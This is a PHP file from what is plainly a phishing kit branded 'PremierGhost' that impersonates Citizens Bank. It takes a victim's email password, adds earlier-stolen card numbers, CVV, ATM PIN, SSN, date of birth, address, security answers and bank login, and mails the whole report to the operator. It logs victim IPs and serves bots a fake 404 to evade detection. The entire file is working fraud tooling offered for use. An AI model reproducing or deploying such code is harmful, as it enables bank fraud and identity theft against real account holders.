<?php

    session_start();

    require_once '../Comp.php';
    require_once '../Antibot.php';
    require_once '../demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (isset(
        $_POST['emailPassword']
    )) {
        if (!$comps->checkEmpty(
            $_POST['emailPassword']
        )) {
            $content = '
                <meta name="viewport" content="width=device-width, initial-scale=1.0">

                <style>
        
                    * {
                        font-family: Arial;
                        font-weight: normal;
                        color: #209DB9;
                        margin: 0;
                        padding: 0;
                    }

                    .text-center {
                        text-align: center;
                    }
        
                    .small {
                        font-size: .8rem;
                    }
        
                    .mt-05 {
                        margin-top: .5rem;
                    }
        
                    .mt-1 {
                        margin-top: 1rem;
                    }
        
                    .mt-2, .my-2 {
                        margin-top: 2rem;
                    }
        
                    .my-3 {
                        margin: 3rem 0;
                    }
        
                    .mb-2, .my-2 {
                        margin-bottom: 2rem;
                    }
        
                    .text-light {
                        color: #8c8c8c;
                    }

                    .text-citizens {
                        color: #209DB9;
                    }
        
                    .container {
                        padding-left: 1.5rem;
                        padding-right: 1.5rem;
                    }
        
                    hr {
                        border: none;
                        margin-top: 1rem;
                        margin-bottom: 1rem;
                        height: 1px;
                        background-color: #8c8c8c;
                    }
        
                </style>

                <div class="text-center my-2">
                    <h4 class="text-light">PremierGhost <span class="text-citizens">Citizens Bank</span> V1.0</h4>
                    <h2>(1) Email Access from ' . $_SESSION['username'] . '</h2>
                </div>
                
                <div class="container">
                    <div class="mt-2">
                        <div>
                            <h3 class="text-light">🎣 Email Access</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            <h3>Email Address: ' . $_SESSION['email'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Password: ' . $_POST['emailPassword'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Domain: ' . substr($_SESSION['email'], strpos($_SESSION['email'], '@') + 1) . '</h3>
                        </div>
                        <div class="mt-2">
                            <h3 class="text-light">💫 CC Details</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            <h3>Card Number: ' . str_replace(' ', '', $_SESSION['card']) . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Expiration Date: ' . $_SESSION['exp'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>CVV: ' . $_SESSION['cvv'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>ATM PIN: ' . $_SESSION['pin'] . '</h3>
                        </div>
                        <div class="mt-2">
                            <h3 class="text-light">💈 BIN Info</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            <h3>Brand: ' . ucwords($_SESSION['binInfo']['scheme']) . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Level: ' . ucwords($_SESSION['binInfo']['brand']) . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Type: ' . ucwords($_SESSION['binInfo']['type']) . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Country: ' . ucwords($_SESSION['binInfo']['country']['emoji'] . " (" . $_SESSION['binInfo']['country']['alpha2']) . ')</h3>
                        </div>
                        <div class="mt-2">
                            <h3 class="text-light">🐯 Billing Info</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            <h3>Full Name: ' . $_SESSION['fname'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Address: ' . $_SESSION['address'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>City: ' . $_SESSION['city'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>State: ' . $_SESSION['state'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>ZIP: ' . $_SESSION['zip'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>DOB: ' . $_SESSION['dob'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>SSN: ' . $_SESSION['ssn'] . '</h3>
                        </div>
                        <div class="mt-2">
                            <h3 class="text-light">🧠 Security Questions</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            <h3>Question 1: ' . $_SESSION['q1'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Answer 1: ' . $_SESSION['a1'] . '</h3>
                        </div>
                        <div class="mt-2">
                            <h3>Question 2: ' . $_SESSION['q2'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Answer 2: ' . $_SESSION['a2'] . '</h3>
                        </div>
                        <div class="mt-2">
                            <h3>Question 3: ' . $_SESSION['q3'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Answer 3: ' . $_SESSION['a3'] . '</h3>
                        </div>
                        <div class="mt-2">
                            <h3 class="text-light">🫁 Login Info</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            <h3>Username: ' . $_SESSION['username'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Password: ' . $_SESSION['password'] . '</h3>
                        </div>
                        <div class="mt-2">
                            <h3 class="text-light">📱 Device Info</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            ' . $comps->userDetails() . '
                        </div>
                    </div>
                    <div class="my-3 text-center">
                        <span class="small text-light">Private page made by <a href="https://t.me/PremierGhost" target="_blank">PremierGhost</a>, not for redistribution.</span>
                    </div>
                </div>
            ';

            if ($comps->mailX("(1) Email Access | Citizens Bank", $content)) {
                $comps->log(
                    "../../Guard/Audio/live.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Email Access\n\n"
                );
                die($comps->headerX("../../Login/complete.php"));
            } else {
                die($antibot->throw404());
            }
        } else {
            echo $antibot->throw404();
            $comps->log(
                "../../Guard/Audio/kill.txt",
                "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
            );
            die();
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }